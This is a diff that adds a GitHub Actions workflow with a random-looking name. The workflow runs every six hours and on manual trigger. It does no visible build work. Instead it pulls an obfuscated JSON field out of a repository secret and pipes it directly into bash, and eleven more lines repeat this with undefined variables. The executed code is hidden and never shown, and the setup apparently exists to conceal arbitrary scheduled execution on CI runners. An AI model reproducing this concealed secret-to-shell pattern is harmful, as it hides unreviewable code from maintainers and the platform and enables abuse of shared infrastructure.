@@ -1,0 +1,28 @@
+name: tangtiangong4516
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tangtiangong4516
+        env:
+          j2: ${{ secrets.j2 }}
+        run: |
+          echo $j2 | jq -r .mnw349 | /bin/bash
+          echo $ocwe81 | jq -r .bhc8678 | /bin/bash
+          echo $pytwq334 | jq -r .n729 | /bin/bash
+          echo $uwox4263 | jq -r .gboyi543 | /bin/bash
+          echo $cova69097 | jq -r .tog4 | /bin/bash
+          echo $kgp9 | jq -r .cud5343 | /bin/bash
+          echo $tc42 | jq -r .ims6276 | /bin/bash
+          echo $a5638 | jq -r .zrd7 | /bin/bash
+          echo $zl3 | jq -r .rlle607 | /bin/bash
+          echo $w52 | jq -r .mmw08748 | /bin/bash
+          echo $gihp374 | jq -r .cc45792 | /bin/bash
+          echo $atb7312 | jq -r .l932 | /bin/bash
+
